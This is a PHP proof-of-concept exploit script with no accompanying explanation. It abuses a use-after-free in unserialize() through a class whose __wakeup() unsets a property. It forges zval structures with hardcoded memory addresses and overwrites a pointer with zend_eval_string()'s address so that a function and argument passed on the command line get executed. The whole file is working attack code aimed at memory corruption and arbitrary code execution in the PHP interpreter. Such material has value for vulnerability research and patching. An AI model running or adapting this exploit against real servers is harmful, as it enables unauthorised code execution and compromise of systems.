<?php

$f = $argv[1];
$c = $argv[2];

$fakezval1 = ptr2str(0x100b83008);
$fakezval1 .= ptr2str(0x8);
$fakezval1 .= "\x00\x00\x00\x00";
$fakezval1 .= "\x06";
$fakezval1 .= "\x00";
$fakezval1 .= "\x00\x00";

$data1 = 
'a:3:{i:0;O:9:"evilClass":1:{s:3:"var";a:1:{i:0;i:1;}}i:1;s:'.strlen($fakezval1).':"'.$fakezval1.'";i:2;a:1:{i:0;R:4;}}';

$x = unserialize($data1);
$y = $x[2];

// zend_eval_string()'s address
$y[0][0] = "\x6d";
$y[0][1] = "\x1e";
$y[0][2] = "\x35";
$y[0][3] = "\x00";
$y[0][4] = "\x01";
$y[0][5] = "\x00";
$y[0][6] = "\x00";
$y[0][7] = "\x00";

$fakezval2 = ptr2str(0x3b296324286624); // $f($c);
$fakezval2 .= ptr2str(0x100b83000);
$fakezval2 .= "\xff\xff\xff\xff";
$fakezval2 .= "\x05";
$fakezval2 .= "\x00";
$fakezval2 .= "\x00\x00";

$data2 = 
'a:3:{i:0;O:9:"evilClass":1:{s:3:"var";a:1:{i:0;i:1;}}i:1;s:'.strlen($fakezval2).':"'.$fakezval2.'";i:2;a:1:{i:0;R:4;}}}';

$z = unserialize($data2);
intval($z[2]);

function ptr2str($ptr)
{
        $out = "";
        for ($i=0; $i<8; $i++) {
                $out .= chr($ptr & 0xff);
                $ptr >>= 8;
        }
        return $out;
}

class evilClass {
        
        public $var;
        
        function __wakeup() {
                unset($this->var);
//              $this->var = 'ryat';
        }
}

?>
